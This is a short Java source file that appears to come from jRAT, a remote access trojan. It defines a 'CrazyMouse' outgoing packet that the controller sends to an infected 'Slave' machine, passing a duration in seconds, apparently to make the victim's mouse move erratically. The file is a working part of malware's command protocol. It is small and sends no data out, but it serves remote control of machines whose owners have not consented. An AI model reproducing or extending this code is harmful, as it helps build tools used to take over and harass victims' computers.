package jrat.controller.packets.outgoing;

import jrat.controller.Slave;


public class Packet46CrazyMouse implements OutgoingPacket {

	private int seconds;

	public Packet46CrazyMouse(int seconds) {
		this.seconds = seconds;
	}

	@Override
	public void write(Slave slave) throws Exception {
		slave.writeInt(seconds);
	}

	@Override
	public short getPacketId() {
		return 46;
	}

}
